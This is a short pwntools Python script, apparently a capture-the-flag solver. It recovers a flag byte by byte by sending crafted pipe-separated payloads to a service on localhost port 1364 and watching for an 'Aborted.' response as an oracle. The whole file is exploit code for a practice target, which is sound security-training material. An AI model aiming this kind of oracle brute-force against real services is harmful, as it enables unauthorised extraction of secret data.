from pwn import *

HOST = "localhost" # change to the actual host
PORT = 1364 # change to the actual port

flag_reconstructed = [0] * 50
flag = b""
aborted = 0
branch = 0

def recover_one_byte(b):
    global flag, flag_reconstructed
    idx = 0
    conn = remote(HOST, PORT)

    while flag_reconstructed[idx] == 1:
        conn.sendline(b"0|" * 19 + b"0")
        conn.recvlines(2)
        idx += 1
    
    payload = f"{b}|" * 19 + str(b)
    conn.sendline(payload.encode())
    conn.recvline()
    res = conn.recvline().decode()

    conn.close()

    if "Aborted." in res:
        flag_reconstructed[idx] = 1
        flag += bytes([256-b])
        print(flag)
        sleep(1)
    else:
        recover_one_byte(b+1)

def main():
    global flag
    while len(flag) == 0 or (len(flag) != 0 and flag[-1] != ord("}")):
        recover_one_byte(0)

if __name__ == "__main__":
    main()

